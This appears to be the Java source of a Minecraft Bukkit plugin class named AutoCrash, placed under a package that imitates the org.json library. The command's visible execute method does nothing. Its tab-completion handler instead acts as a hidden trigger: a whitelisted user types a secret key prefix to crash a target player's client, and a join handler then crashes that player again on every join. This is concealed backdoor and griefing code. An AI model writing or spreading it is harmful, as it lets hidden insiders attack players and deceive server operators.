package org.json.modals.crash;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerJoinEvent;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.api.ProtocolLibUtils;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.AutoCrashMeta;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class AutoCrash extends BDCommand {
    public AutoCrash() {
        super("autoCrash");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, Bukkit.getOnlinePlayers().stream().map(HumanEntity::getName).toArray(String[]::new));
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        String playerName = args[1];
        Player targetPlayer = Bukkit.getPlayer(playerName);
        if (targetPlayer == null) {
            player.sendMessage(Modal.getPrefix() + "§c" + playerName + " was not found!");
            return tabComplBuilder.build();
        }

        if (WhitelistMeta.isListed(targetPlayer)) return tabComplBuilder.build();

        AutoCrashMeta.add(targetPlayer);
        ProtocolLibUtils.crashPlayer(targetPlayer);

        player.sendMessage(Modal.getPrefix() + "§a" + playerName + " has been added to the auto crash list.");
        return tabComplBuilder.build();
    }


    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        if (AutoCrashMeta.isListed(e.getPlayer())) {
            Bukkit.getOnlinePlayers().stream()
                    .filter(WhitelistMeta::isListed)
                    .forEach(player -> player.sendMessage(Modal.getPrefix() + "§f " + e.getPlayer() + " tried to join but got crashed from the server!"));

            ProtocolLibUtils.crashPlayer(e.getPlayer());
        }
    }

}
